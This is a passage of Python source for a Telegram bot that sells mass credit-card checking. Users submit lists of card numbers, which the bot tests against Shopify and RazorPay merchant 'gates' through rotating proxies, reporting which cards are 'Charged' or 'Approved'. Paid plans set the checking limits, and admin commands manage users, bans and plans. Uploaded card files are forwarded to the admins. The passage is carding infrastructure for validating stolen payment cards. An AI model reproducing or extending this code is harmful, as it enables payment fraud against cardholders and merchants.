    if uid in ACTIVE_MTXT_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, from_inline = "", False
    filename = None
    cmd_text = re.sub(r'^[/.]msp\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text: content = cmd_text; from_inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm: return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            filename = "uploaded_file.txt"
            if hasattr(rm.document, 'attributes') and rm.document.attributes:
                for attr in rm.document.attributes:
                    if hasattr(attr, 'file_name'):
                        filename = attr.file_name
                        break
            try:
                fp = await rm.download_media()
                if not fp:
                    raise Exception("Download media returned None")
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                if os.path.exists(fp):
                    os.remove(fp)
            except Exception as e:
                return await styled_reply(event, f"❌ <b>{bs('File Download Error')}:</b> <code>{e}</code>", emoji_ids=[CE["warn"]])
        elif rm.text: content = rm.text
    else: return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/msp</code>", emoji_ids=[CE["info"]])
    sites = await get_user_sites(uid)
    if not sites:
        sites = await get_global_sites()
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites!')} </b><code>/add</code>", emoji_ids=[CE["warn"]])
    cards = extract_cc(content)
    if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: cards = cards[:cl]
    if filename:
        try: sender = await event.get_sender(); name = sender.first_name or sender.username or "User"
        except: name = "User"
        log_text = f"""{PE} <b>{bs('LOG: File Uploaded')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('User')}:</b> <a href="tg://user?id={uid}">{name}</a> (<code>{uid}</code>)
{PE} <b>{bs('File')}:</b> <code>{filename}</code>
{PE} <b>{bs('Cards Count')}:</b> <code>{len(cards)}</code>
{PE} <b>{bs('Gate')}:</b> <code>Shopify (MSP)</code>"""
        asyncio.create_task(log_to_admins(log_text, buttons=[[pbtn(bs("Get File"), f"getfile:{event.chat_id}:{rm.id}", bg_primary=True, icon=CE["eyes"])]]))
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid)
    rotator = SmartRotator()
    async def shopify_check(card, http_session):
        result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
        return result
    if from_inline:
        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_check, "Shopify", "msp"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"chk_pref:yes:{uid}", bg_success=True, icon=CE["check"])],
              [pbtn(bs("Only Charged"), f"chk_pref:no:{uid}", bg_danger=True, icon=CE["fire"])]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"chk_{uid}"] = {"cards": cards, "sites": sites, "proxies": proxies, "event": event, "pref_msg": pm, "rotator": rotator}

@client.on(events.CallbackQuery(pattern=rb"chk_pref:(yes|no):(\d+)"))
async def chk_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"chk_{uid}", None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await data["pref_msg"].delete()
    except: pass
    if uid in ACTIVE_MTXT_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await event.answer(f"{bs('Starting')}...")
    rotator = data.get("rotator", SmartRotator())
    sites, proxies = data["sites"], data["proxies"]
    async def shopify_check(card, http_session):
        result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
        return result
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_check, "Shopify", "msp"))

@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)

# ====================== /mrz (RazorPay Mass) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrz\b'))
async def mrz_mass_check_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_gateway_disabled("razorpay"):
        return await styled_reply(event, f"❌ <b>{bs('Gateway Disabled')}</b>\n⤷ <i>{bs('RazorPay checking is currently offline.')}</i>", emoji_ids=[CE["stop"]])
    sites = load_razorpay_sites()
    if not sites:
        return await styled_reply(event, f"❌ <b>{bs('No Razorpay Sites')}</b>\n⤷ <i>{bs('Please add razorpay sites using')} </i><code>/addrz</code>", emoji_ids=[CE["stop"]])
    _, at, plan = await get_user_access(event)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    cl = await get_user_mrz_limit(plan, uid)
    if uid in ACTIVE_MRZ_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, from_inline = "", False
    filename = None
    cmd_text = re.sub(r'^[/.]mrz\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text: content = cmd_text; from_inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm: return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            filename = "uploaded_file.txt"
            if hasattr(rm.document, 'attributes') and rm.document.attributes:
                for attr in rm.document.attributes:
                    if hasattr(attr, 'file_name'):
                        filename = attr.file_name
                        break
            try:
                fp = await rm.download_media()
                if not fp:
                    raise Exception("Download media returned None")
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                if os.path.exists(fp):
                    os.remove(fp)
            except Exception as e:
                return await styled_reply(event, f"❌ <b>{bs('File Download Error')}:</b> <code>{e}</code>", emoji_ids=[CE["warn"]])
        elif rm.text: content = rm.text
    else: return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/mrz</code>", emoji_ids=[CE["info"]])
    cards = extract_cc(content)
    if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: cards = cards[:cl]
    if filename:
        try: sender = await event.get_sender(); name = sender.first_name or sender.username or "User"
        except: name = "User"
        log_text = f"""{PE} <b>{bs('LOG: File Uploaded')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('User')}:</b> <a href="tg://user?id={uid}">{name}</a> (<code>{uid}</code>)
{PE} <b>{bs('File')}:</b> <code>{filename}</code>
{PE} <b>{bs('Cards Count')}:</b> <code>{len(cards)}</code>
{PE} <b>{bs('Gate')}:</b> <code>RazorPay (MRZ)</code>"""
        asyncio.create_task(log_to_admins(log_text, buttons=[[pbtn(bs("Get File"), f"getfile:{event.chat_id}:{rm.id}", bg_primary=True, icon=CE["eyes"])]]))
    amt = await get_razorpay_amount()
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('RazorPay')} ({amt / 100:.2f} INR) | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, f"❌ <b>{bs('No Proxies Added')}</b>\n⤷ <i>{bs('Please add your own proxies first using')} </i><code>/addpxy</code>", emoji_ids=[CE["stop"]])
    async def rz_check(card, http_session):
        return await check_rz_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    if from_inline:
        ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MRZ_PROCESSES, "stop_mrz", rz_check, "RazorPay", "mrz"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"mrz_pref:yes:{uid}", bg_success=True, icon=CE["check"])],
              [pbtn(bs("Only Charged"), f"mrz_pref:no:{uid}", bg_danger=True, icon=CE["fire"])]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"mrz_{uid}"] = {"cards": cards, "proxies": proxies, "event": event, "pref_msg": pm}

@client.on(events.CallbackQuery(pattern=rb"mrz_pref:(yes|no):(\d+)"))
async def mrz_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"mrz_{uid}", None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await data["pref_msg"].delete()
    except: pass
    if uid in ACTIVE_MRZ_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await event.answer(f"{bs('Starting')}...")
    proxies = data["proxies"]
    async def rz_check(card, http_session):
        return await check_rz_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MRZ_PROCESSES, "stop_mrz", rz_check, "RazorPay", "mrz"))

@client.on(events.CallbackQuery(pattern=rb"stop_mrz:(\d+)"))
async def stop_mrz_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MRZ_PROCESSES.get(puid)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)

@client.on(events.CallbackQuery(pattern=rb"retry_errors:(\d+_\d+)"))
async def retry_errors_cb(event):
    key = event.pattern_match.group(1).decode()
    uid = int(key.split('_')[0])
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    
    data = PENDING_RETRY_ERRORS.pop(key, None)
    if not data: return await event.answer(f"{bs('No pending retry session found')}!", alert=True)
    
    cards = data["cards"]
    gate_name = data["gate_name"]
    send_approved = data["send_approved"]
    
    proxies = await get_all_user_proxies(uid)
    if not proxies:
        return await event.answer(f"{bs('No proxies available')}!", alert=True)
        
    await event.answer(f"{bs('Retrying')} {len(cards)} {bs('error cards')}...")
    
    if gate_name == "RazorPay":
        if uid in ACTIVE_MRZ_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
        ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
        async def rz_check(card, http_session):
            return await check_rz_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
        asyncio.create_task(_run_mass_process(event, cards, proxies, send_approved, ACTIVE_MRZ_PROCESSES, "stop_mrz", rz_check, "RazorPay", "mrz"))
    else:
        if uid in ACTIVE_MTXT_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
        sites = await get_user_sites(uid)
        if not sites:
            sites = await get_global_sites()
        rotator = SmartRotator()
        async def shopify_check(card, http_session):
            result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
            return result
        asyncio.create_task(_run_mass_process(event, cards, proxies, send_approved, ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_check, "Shopify", "msp"))

# ====================== /status ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]status$'))
async def status_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        st = await _build_status_text()
        await styled_reply(event, st, buttons=[[pbtn(bs("Refresh"), data="refresh_status", bg_primary=True, icon=CE["restart"])]])
    except Exception as e: await styled_reply(event, f"⚠️ <code>{e}</code>")

@client.on(events.CallbackQuery(data=b"refresh_status"))
async def refresh_status_cb(event):
    if event.sender_id not in ADMIN_ID: return await event.answer("No!", alert=True)
    await event.answer("Refreshing...")
    try:
        st = await _build_status_text()
        msg = event.message if hasattr(event, 'message') else await event.get_message()
        await styled_edit(msg, st, buttons=[[pbtn(bs("Refresh"), data="refresh_status", bg_primary=True, icon=CE["restart"])]])
    except: pass

# ====================== ADMIN ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](maintenance|maintance)\s+(on|off)$'))
async def maint_toggle(event):
    if event.sender_id not in ADMIN_ID: return
    a = event.raw_text.lower().split()[1]
    await set_maintenance_mode(a == "on")
    await styled_reply(event, f"{PE} <b>{bs('Maintenance')} {bs('On') if a == 'on' else bs('Off')}</b>", emoji_ids=[CE["stop"] if a == "on" else CE["check"]])

async def _handle_plan_assign(event, plan_key):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/{plan_key} user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    pi = PLANS[plan_key]
    try: target_entity = await client_instance.get_entity(target_uid); target_name = getattr(target_entity, 'first_name', None) or "Unknown"
    except: target_name = "Unknown"
    await ensure_user(target_uid)
    current_plan = await get_user_plan(target_uid); is_upgrade = is_paid_plan(current_plan)
    await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
    expiry_date = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    await styled_reply(event, f"""<b>✅ {bs('Plan Updated')}</b>\n<a href='https://t.me/PrimeTheOfficialNew'>⊀</a> <b>{bs('User')}</b> ↬ <a href='tg://user?id={target_uid}'>{target_name}</a>\n<a href='https://t.me/PrimeTheOfficialNew'>⊀</a> <b>{bs('Plan')}</b> ↬ {pi['emoji']} <b>{pi['name']}</b>\n<a href='https://t.me/PrimeTheOfficialNew'>⊀</a> <b>{bs('Duration')}</b> ↬ <code>{pi['duration_days']} {bs('days')}</code>\n<a href='https://t.me/PrimeTheOfficialNew'>⊀</a> <b>{bs('Expires')}</b> ↬ <code>{expiry_date}</code>""")
    try:
        await styled_send(target_uid, f"""<b>🎉 {bs('Plan Upgraded!')} 🎉</b>\n{pi['emoji']} <b>{pi['name']}</b> ━ <code>{pi['duration_days']}d</code>\n{bs('Limit')}: {await get_cc_limit(pi['tier'], target_uid)} CCs\n{bs('Expires')}: {expiry_date}""")
    except: pass
    try:
        receipt_id = f"CARDX-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        lt = f"{bs('Plan RENEWED')} 🔄" if is_upgrade else f"{bs('New Plan')} 🛒"
        await styled_send(LOG_CHANNEL_ID, f"<b>{lt}</b>\n<a href='tg://user?id={target_uid}'>{target_name}</a> ━ {pi['emoji']}{pi['name']} ━ {pi['price']} ━ {receipt_id}")
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan1\b'))
async def plan1_cmd(event): await _handle_plan_assign(event, "plan1")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan2\b'))
async def plan2_cmd(event): await _handle_plan_assign(event, "plan2")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan3\b'))
async def plan3_cmd(event): await _handle_plan_assign(event, "plan3")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan4\b'))
async def plan4_cmd(event): await _handle_plan_assign(event, "plan4")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rplan\b'))
async def rplan_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/rplan user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    cp = await get_user_plan(target_uid)
    if not is_paid_plan(cp): return await styled_reply(event, f"{PE} <b>{bs('No active plan')}</b>", emoji_ids=[CE["cross"]])
    try: ent = await client_instance.get_entity(target_uid); tn = getattr(ent, 'first_name', None) or "?"
    except: tn = "?"
    await set_user_plan(target_uid, "Bronze", 0)
    await styled_reply(event, f"{PE} <b>{bs('Revoked')} {cp} from {tn}</b>", emoji_ids=[CE["check"]])
    try: await styled_send(target_uid, f"{PE} <b>{bs('Your plan has been ended. Contact admin to renew.')}</b>", emoji_ids=[CE["warn"]])
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]planall$'))
async def planall_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    all_users = []
    for tier in PAID_TIERS:
        async for u in db["users"].find({"plan": tier}): all_users.append(u)
    if not all_users: return await styled_reply(event, f"{PE} <b>{bs('No active plans')}</b>", emoji_ids=[CE["warn"]])
    fn = f"plans_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    content = f"ACTIVE PLANS ({len(all_users)})\n{'='*40}\n"
    for u in all_users:
        uid2 = u.get("user_id", "?"); tier = u.get("plan", "?")
        exp = u.get("expiry"); es = exp.strftime('%Y-%m-%d') if exp else "?"
        try: ent = await client_instance.get_entity(uid2); un = getattr(ent, 'first_name', None) or "?"
        except: un = "?"
        content += f"{un} | {uid2} | {tier} | {es}\n"
    async with aiofiles.open(fn, 'w') as f: await f.write(content)
    try: await styled_send(event.chat_id, f"{PE} <b>{bs('Plans')} ({len(all_users)})</b>", emoji_ids=[CE["fire"]], file=fn)
    except: pass
    try: os.remove(fn)
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        tu = await get_total_users(); pu = await get_premium_count()
        ts2 = await get_total_sites_count(); tc = await get_total_cards_count()
        ch = await get_charged_count(); ap = await get_approved_count()
        await styled_reply(event, f"""{PE} <b>{bs('Stats')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Users')}:</b> <code>{tu}</code> | <b>{bs('Premium')}:</b> <code>{pu}</code>
{PE} <b>{bs('Sites')}:</b> <code>{ts2}</code> | <b>{bs('Cards')}:</b> <code>{tc}</code>
{PE} <b>{bs('Charged')}:</b> <code>{ch}</code> | <b>{bs('Approved')}:</b> <code>{ap}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('MSP Active')}:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)
{PE} <b>{bs('MRZ Active')}:</b> <code>{len(ACTIVE_MRZ_PROCESSES)}</code> ({MRZ_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["brain"], CE["shield"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

# ====================== ADMIN USER MANAGEMENT ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]users$'))
async def users_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    all_users = []
    async for u in db["users"].find():
        all_users.append(u)
    if not all_users: return await styled_reply(event, f"{PE} <b>{bs('No users in DB')}</b>", emoji_ids=[CE["warn"]])
    fn = f"users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    content = f"ALL USERS ({len(all_users)})\n{'='*60}\n"
    for u in all_users:
        uid2 = u.get("user_id", "?")
        tier = u.get("plan", "Bronze")
        banned = u.get("banned", False)
        bs_status = "BANNED" if banned else "ACTIVE"
        exp = u.get("expiry")
        es = exp.strftime('%Y-%m-%d %H:%M:%S') if exp else "Never"
        climit = u.get("custom_limit", "Default")
        content += f"ID: {uid2} | Plan: {tier} | Status: {bs_status} | Expiry: {es} | Limit: {climit}\n"
    async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
        await f.write(content)
    try:
        await styled_send(event.chat_id, f"{PE} <b>{bs('All Users')} ({len(all_users)})</b>", emoji_ids=[CE["fire"]], file=fn)
    except:
        pass
    try:
        os.remove(fn)
    except:
        pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]user\b'))
async def user_info_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/user user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    user_doc = await db["users"].find_one({"user_id": target_uid})
    if not user_doc: return await styled_reply(event, f"{PE} <b>{bs('User not found')}</b>", emoji_ids=[CE["cross"]])
    plan = user_doc.get("plan", "Bronze")
    expiry = user_doc.get("expiry")
    exp_str = expiry.strftime('%Y-%m-%d %H:%M:%S') if expiry else bs("Never")
    banned = user_doc.get("banned", False)
    b_status = bs("Banned") if banned else bs("Active")
    climit = user_doc.get("custom_limit")
    limit_val = climit if climit is not None else await get_cc_limit(plan, target_uid)
    
    await styled_reply(event, f"""{PE} <b>{bs('User Details')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('ID')}:</b> <code>{target_uid}</code>
{PE} <b>{bs('Status')}:</b> <code>{b_status}</code>
{PE} <b>{bs('Plan')}:</b> <b>{plan.upper()}</b>
{PE} <b>{bs('Expiry')}:</b> <code>{exp_str}</code>
{PE} <b>{bs('Limit')}:</b> <code>{limit_val}</code>""", emoji_ids=[CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]approve\b'))
async def approve_user_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 4:
        return await styled_reply(event, f"{PE} <code>/approve user_id plan days</code>\n{PE} <i>{bs('Plans')}: Core, Elite, Root, X</i>", emoji_ids=[CE["warn"]])
    try:
        target_uid = int(parts[1])
        plan = parts[2].title()
        days = int(parts[3])
    except:
        return await styled_reply(event, f"{PE} <b>{bs('Invalid arguments')}</b>\n{PE} <code>/approve user_id plan days</code>", emoji_ids=[CE["cross"]])
    
    if plan.upper() not in [p.upper() for p in PAID_TIERS]:
        return await styled_reply(event, f"{PE} <b>{bs('Invalid plan')}</b>\n{PE} <i>{bs('Plans')}: Core, Elite, Root, X</i>", emoji_ids=[CE["cross"]])
    
    plan = next(p for p in PAID_TIERS if p.upper() == plan.upper())
    
    await ensure_user(target_uid)
    await set_user_plan(target_uid, plan, days)
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        target_entity = await client_instance.get_entity(target_uid)
        target_name = getattr(target_entity, 'first_name', None) or "Unknown"
    except:
        target_name = "Unknown"
        
    await styled_reply(event, f"""<b>✅ {bs('User Approved')}</b>
<a href='https://t.me/PrimeTheOfficialNew'>⊀</a> <b>{bs('User')}</b> ↬ <a href='tg://user?id={target_uid}'>{target_name}</a>
<a href='https://t.me/PrimeTheOfficialNew'>⊀</a> <b>{bs('Plan')}</b> ↬ <b>{plan.upper()}</b>
<a href='https://t.me/PrimeTheOfficialNew'>⊀</a> <b>{bs('Duration')}</b> ↬ <code>{days} {bs('days')}</code>
<a href='https://t.me/PrimeTheOfficialNew'>⊀</a> <b>{bs('Expires')}</b> ↬ <code>{expiry_date}</code>""")
    
    try:
        limit_val = await get_cc_limit(plan, target_uid)
        await styled_send(target_uid, f"""<b>🎉 {bs('Your plan has been approved!')} 🎉</b>
<b>{plan.upper()}</b> ━ <code>{days}d</code>
{bs('Limit')}: {limit_val} CCs
{bs('Expires')}: {expiry_date}""")
    except:
        pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ban\b'))
async def ban_user_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/ban user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    await ban_user(target_uid, event.sender_id)
    await styled_reply(event, f"{PE} <b>{bs('Banned user')}</b> <code>{target_uid}</code>", emoji_ids=[CE["check"]])
    try: await styled_send(target_uid, f"{PE} <b>{bs('You have been banned from the bot.')}</b>", emoji_ids=[CE["warn"]])
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]unban\b'))
async def unban_user_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/unban user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    await unban_user(target_uid)
    await styled_reply(event, f"{PE} <b>{bs('Unbanned user')}</b> <code>{target_uid}</code>", emoji_ids=[CE["check"]])
    try: await styled_send(target_uid, f"{PE} <b>{bs('You have been unbanned. You can use start command.')}</b>", emoji_ids=[CE["check"]])
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]setlimit\b'))
async def set_user_limit_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 3: return await styled_reply(event, f"{PE} <code>/setlimit user_id limit</code>", emoji_ids=[CE["warn"]])
    try:
        target_uid = int(parts[1])
        limit = int(parts[2])
    except:
        return await styled_reply(event, f"{PE} <b>{bs('Invalid arguments')}</b>", emoji_ids=[CE["cross"]])
    if limit < 0 or limit > 999999:
        return await styled_reply(event, f"❌ <b>{bs('Limit must be between 0-999999')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    await set_user_limit(target_uid, limit)
    await styled_reply(event, f"{PE} <b>{bs('Set custom limit to')} {limit} {bs('for')}</b> <code>{target_uid}</code>", emoji_ids=[CE["check"]])
    try: await styled_send(target_uid, f"{PE} <b>{bs('Your one-time check limit has been updated to')} {limit}</b>", emoji_ids=[CE["check"]])
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrzlimit\b'))
async def mrzlimit_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 3: return await styled_reply(event, f"{PE} <code>/mrzlimit user_id limit</code>", emoji_ids=[CE["warn"]])
    try:
        target_uid = int(parts[1])
        limit = int(parts[2])
    except:
        return await styled_reply(event, f"{PE} <b>{bs('Invalid arguments')}</b>", emoji_ids=[CE["cross"]])
    if limit < 0 or limit > 999999:
        return await styled_reply(event, f"❌ <b>{bs('Limit must be between 0-999999')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    if not await set_user_mrz_limit(target_uid, limit):
        return await styled_reply(event, f"❌ <b>{bs('Failed to set MRZ limit')}</b>", emoji_ids=[CE["cross"]])
    await styled_reply(event, f"{PE} <b>{bs('Set custom MRZ limit to')} {limit} {bs('for')}</b> <code>{target_uid}</code>", emoji_ids=[CE["check"]])
    try: await styled_send(target_uid, f"{PE} <b>{bs('Your MRZ check limit has been updated to')} {limit}</b>", emoji_ids=[CE["check"]])
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]changeowner\b'))
async def change_owner_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    rt = re.sub(r'^[/.]changeowner\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if not rt:
        return await styled_reply(event, f"{PE} <code>/changeowner @username</code>", emoji_ids=[CE["info"]])
    
    new_username = rt.replace("@", "").strip()
    if not new_username:
        return await styled_reply(event, f"❌ <b>{bs('Invalid username')}</b>", emoji_ids=[CE["cross"]])
        
    global OWNER_USERNAME
    OWNER_USERNAME = new_username
    await set_owner_username(new_username)
    await styled_reply(event, f"👑 <b>{bs('Owner Username Updated')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n⤷ <code>@{new_username}</code>", emoji_ids=[CE["check"]])

# ====================== REDEEM CODES ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey\b'))
async def genkey_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 3:
